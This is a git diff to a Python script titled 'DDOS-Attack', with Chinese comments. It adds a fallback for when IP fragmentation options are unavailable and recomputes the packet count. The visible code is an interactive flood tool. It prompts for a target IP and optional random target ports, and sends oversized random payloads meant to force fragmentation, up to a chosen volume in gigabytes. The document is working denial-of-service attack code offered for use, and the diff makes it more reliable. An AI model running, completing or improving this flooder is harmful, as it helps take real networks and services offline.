@@ -30,7 +30,7 @@ time.sleep(2)
 
 os.system("clear")
 os.system("figlet DDOS-Attack")
-print("Author    : BCU-0")
+print("Author    : BC-U809")
 print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
 print("")
 
@@ -40,7 +40,7 @@ print("")
 while True:
     try:
         ip_str = input("IP Target : ").strip()
-        ipaddress.ip_address(ip_str)   # 验证合法性
+        ipaddress.ip_address(ip_str)
         target_ip = ip_str
         break
     except ValueError:
@@ -89,9 +89,9 @@ use_fragmentation = (frag == 'y')
 rnd = input("使用随机目标端口? (y/N): ").strip().lower()
 random_target_port = (rnd == 'y')
 
-# 根据分片设置载荷大小
+# 根据分片设置载荷大小（初始值）
 if use_fragmentation:
-    PACKET_SIZE = 3000   # 大于常见 MTU，强制分片
+    PACKET_SIZE = 3000   # 大于常见 MTU，意图分片
 else:
     PACKET_SIZE = 1490
 
@@ -151,10 +151,24 @@ if source_port is not None:
         sock.close()
         sys.exit(1)
 
-# IP 分片设置
+# --- 尝试设置 IP 分片，失败则降级 ---
+frag_enabled = False
 if use_fragmentation:
-    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
-    sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
+    try:
+        # 检查必要的常量是否存在
+        if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
+            frag_enabled = True
+        else:
+            raise AttributeError("IP_MTU_DISCOVER not available")
+    except (AttributeError, OSError) as e:
+        print(f"[!] 无法启用 IP 分片 ({e})，将使用普通发送模式（载荷 1490 字节）。")
+        PACKET_SIZE = 1490
+        # 重新计算总包数
+        total_bytes = int(total_gb * 1024 * 1024 * 1024)
+        max_packets = total_bytes // PACKET_SIZE
+        print(f"[*] 调整后总包数: {max_packets}")
 
 payload = os.urandom(PACKET_SIZE)
 
